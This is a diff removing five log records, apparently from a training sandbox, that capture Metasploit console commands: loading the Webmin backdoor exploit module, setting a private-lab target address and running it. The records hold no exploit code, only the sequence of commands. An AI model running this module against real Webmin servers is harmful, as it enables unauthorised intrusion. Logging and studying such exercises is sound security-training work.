@@ -1,5 +1,0 @@
-{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:44:51.854175+02:00", "cmd_type": "msf-command", "cmd": "run"}
-{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:45:09.377019+02:00", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
-{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:45:12.012712+02:00", "cmd_type": "msf-command", "cmd": "show options"}
-{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:45:24.245031+02:00", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
-{"sandbox_id": "77", "timestamp_str": "2020-07-15T09:45:30.361954+02:00", "cmd_type": "msf-command", "cmd": "run"}
